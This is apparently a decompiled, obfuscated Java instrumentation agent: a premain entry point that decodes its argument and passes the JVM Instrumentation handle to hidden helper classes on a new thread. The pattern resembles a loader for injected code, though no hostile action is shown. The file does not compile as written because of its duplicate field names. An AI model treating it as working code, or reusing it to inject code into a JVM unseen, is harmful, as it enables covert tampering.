package net.java;

import java.lang.instrument.Instrumentation;

public class f implements Runnable {
   private byte[] a;
   private Instrumentation a;

   public static void premain(String var0, Instrumentation var1) {
      byte[] var2 = null;
      if (var0 != null) {
         try {
            StringBuilder var4;

            var2 = l.a(var0.getBytes("UTF-8"));
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      }

      n.a();
      f var5;
      (var5 = new f()).a = var2;
      var5.a = var1;
      new Thread(var5).start();
   }

   @Override
   public void run() {
      l.a(new Object[]{this.a, this.a, 1, null, null, n.a.trim()});
   }
}
